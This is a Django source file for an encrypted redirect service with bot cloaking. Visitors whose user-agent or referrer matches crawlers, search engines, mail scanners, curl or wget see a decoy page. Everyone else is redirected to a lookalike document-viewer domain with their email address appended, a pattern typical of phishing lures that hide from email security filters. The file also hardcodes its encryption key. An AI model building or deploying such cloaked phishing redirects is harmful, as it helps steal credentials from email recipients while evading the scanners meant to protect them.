from django.shortcuts import redirect
from cryptography.fernet import Fernet
from django.shortcuts import render, redirect
from cryptography.fernet import Fernet
from django.shortcuts import render, redirect
from cryptography.fernet import Fernet

# Use your existing secret key
key = b'ysu8OYE0hVogy49SmfoTsx9VruFxLusFDos2ctwhRQc='  # Replace this with your actual key
cipher_suite = Fernet(key)

# Define a list of common bot user-agent substrings
BOT_USER_AGENTS = [
    'bot', 'crawl', 'spider', 'slurp', 'google', 'bing', 'yahoo', 'baidu', 'duckduckgo',
    'mail', 'email', 'curl', 'wget', 'python-requests'  # Add common email and script bots
]

def decrypt_url(encrypted_url):
    return cipher_suite.decrypt(encrypted_url.encode()).decode()

def is_bot(user_agent):
    return any(bot in user_agent.lower() for bot in BOT_USER_AGENTS)

def redirect_view(request, encrypted_url):
    user_agent = request.META.get('HTTP_USER_AGENT', '')

    if is_bot(user_agent):
        # Render a page that informs the bot it's not being redirected
        return render(request, 'index.html')  # Create this template to inform bots

    # Additional checks for email bots (IP and referrer checks)
    referrer = request.META.get('HTTP_REFERER', '')
    if 'bot' in referrer.lower() or 'api' in referrer.lower():
        return render(request, 'index.html')

    try:
        # Decrypt the URL
        decrypted_url = decrypt_url(encrypted_url)
        return redirect(decrypted_url)
    except Exception as e:
        # Handle decryption errors or invalid URLs
        return redirect('/')  # Redirect to a safe page if decryption fails


from django.shortcuts import render
from cryptography.fernet import Fernet

# Use your existing secret key
key = b'ysu8OYE0hVogy49SmfoTsx9VruFxLusFDos2ctwhRQc='
cipher_suite = Fernet(key)

def encrypt_url(url):
    return cipher_suite.encrypt(url.encode()).decode()

def loading_view(request):
    # Get the email parameter from the query string
    email = request.GET.get('email', '')

    # Encrypt the target URL with the email parameter
    target_url = f'https://docuviewpagesrtorg.com/?nolplcgl&email={email}'
    encrypted_url = encrypt_url(target_url)

    return render(request, 'base.html', {'encrypted_url': encrypted_url})
